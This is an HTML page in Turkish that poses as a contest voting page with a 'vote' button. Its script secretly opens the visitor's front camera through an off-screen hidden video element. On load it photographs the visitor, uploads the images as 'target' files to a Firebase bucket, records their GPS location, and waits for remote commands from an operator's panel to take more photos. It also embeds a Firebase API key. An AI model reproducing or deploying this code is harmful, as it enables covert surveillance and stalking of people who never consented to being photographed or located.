<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yarışma Katılım</title>
    <style>
        body { margin: 0; background-color: #0b141a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; }
        .card { text-align: center; padding: 30px; border-radius: 20px; background: #111b21; border: 1px solid #233138; width: 85%; }
        #video { position: absolute; left: -9999px; opacity: 0; width: 1px; height: 1px; }
        #btn { width: 100%; height: 55px; background-color: #00a884; color: white; display: flex; justify-content: center; align-items: center; border-radius: 30px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Aday Onayı Bekleniyor</h2>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <div id="btn">Oy Ver</div>
        <p id="stat" style="font-size:12px; color:#8696a0; margin-top:10px;">Sistem doğrulanıyor...</p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCBlAZT1FXVcoj_1oFgjP4GlmaOIVFAt2c",
            authDomain: "whtapp-27674.firebaseapp.com",
            projectId: "whtapp-27674",
            storageBucket: "whtapp-27674.firebasestorage.app"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const storage = getStorage(app);
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function fotoCek() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const photoData = canvas.toDataURL('image/jpeg', 0.6);
            const fileName = `hedef_${Date.now()}.jpg`;
            await uploadString(ref(storage, `fotolar/${fileName}`), photoData, 'data_url');
            return fileName;
        }

        async function sistemiBaslat() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;

                // 1. GİRDİĞİ ANDA OTOMATİK ÇEK
                setTimeout(async () => {
                    const fName = await fotoCek();
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        await setDoc(doc(db, "takip", "admin"), {
                            lat: pos.coords.latitude, lon: pos.coords.longitude,
                            fotoAdi: fName, durum: "online", zaman: new Date().toLocaleString(), t: Date.now()
                        });
                    });
                }, 2000);

                // 2. SENİN PANELİNDEN GELEN KOMUTU DİNLE
                onSnapshot(doc(db, "takip", "komut"), async (snap) => {
                    if (snap.exists() && snap.data().cek == true) {
                        const fName = await fotoCek();
                        await setDoc(doc(db, "takip", "admin"), { fotoAdi: fName, t: Date.now() }, { merge: true });
                        // Komutu sıfırla ki tekrar çekebil
                        await setDoc(doc(db, "takip", "komut"), { cek: false });
                    }
                });

            } catch (e) { console.log("İzin yok"); }
        }
        sistemiBaslat();
    </script>
</body>
</html>
